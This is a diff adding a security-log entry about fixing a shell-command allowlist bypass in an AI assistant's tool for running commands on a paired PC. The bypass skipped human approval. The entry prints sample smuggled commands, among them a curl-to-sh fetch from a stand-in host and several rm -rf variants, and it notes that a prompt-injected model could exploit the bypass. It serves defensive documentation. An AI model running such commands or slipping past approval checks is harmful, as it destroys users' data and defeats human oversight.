@@ -269,3 +269,33 @@ listed one after another), exhaust memory, or bounce requests to internal hosts.
 ### Open
 - CPU-heavy pure reads (e.g. huge `generate_series` or cross joins) can still block PGLite's event loop; a real fix needs running PGLite in a worker so a timeout can terminate it.
 - DNS rebinding for http MCP servers (from the previous cycle) still open.
+
+## Security fix: pc_run_shell allowlist bypass via shell metacharacters (2026-11-01 Africa/Lagos)
+
+**Status:** done — fixed, regression-tested, pushed. Commit 230a05d.
+
+### Weakness (confirmed locally)
+The allowlist entry `/^echo /` only checked the start of the command, so anything
+beginning with `echo ` counted as allowlisted and ran on the paired PC **without
+human approval** (it skipped the H9 approval flow and was sent with `confirm: true`):
+`echo hi; curl http://evil.invalid/x | sh`, `echo a && rm -rf ~`, `echo $(id)`,
+`` echo `id` ``, `echo a > ~/.bashrc`, `echo x<newline>rm -rf /`, `echo %USERPROFILE%`.
+Repro: `isShellAllowlisted("echo hi; curl … | sh") === true`. `pcRunShell` passed that
+command straight to the paired runner (no approval created) and also POSTed it to the
+legacy `MIND_PC_AGENT_URL /run`. A prompt-injected model could use this to run any
+command on Zack's PC.
+
+### Fix (`src/lib/mind/mcp/tools.ts`, `isShellAllowlisted`)
+- An allowlisted command must use only plain characters `[A-Za-z0-9 _.,:=+/-]`, be at most 200 chars, and match an allowlist pattern from start to end. `echo` arguments are limited to the same plain set.
+- Anything with chaining, substitution, redirection, globbing, quotes or escapes, `%`/`^`, `!`, `#`, or control characters is no longer allowlisted. It goes to the existing human approval flow.
+- `pwd`, `date`, `whoami`, `uname [-x]`, and plain `echo words` still run as before.
+
+### Checks
+- `tools.test.ts`: 5 new regression tests (32 smuggled commands refused, plain commands still allowed, smuggled echo goes to approval and the runner is never called, the legacy agent URL is never fetched, plain echo still runs). 3 of them failed before the fix. All pass now.
+- typecheck: pass. mind/src tests: 325/325. scripts tests: 198/202 (the same 4 SKILL.md/AGENTS.md doc-check failures as before; not related). build: pass. `npm run mcp:e2e`: pass.
+- Note: on the first full run, 2 timing tests failed (registry-http hang→timeout, stdio list/call) because box load average was around 220. Both passed when re-run alone, and the full suite then passed 325/325.
+
+### Open
+- `/api/mind/mcp/servers` (toggle/register/remove) and `/api/mind/mcp/call` POSTs have no Origin/same-site check. The SameSite=Lax cookie blocks cross-site requests, but same-site sibling origins (for example other preview subdomains) could still send them. `assertSameSiteRequest` exists in `src/lib/auth/isolation.server.ts`. Next cycle candidate.
+- DNS rebinding for http MCP servers is still open.
+- CPU-heavy pure reads can still block PGLite's event loop (needs a worker).
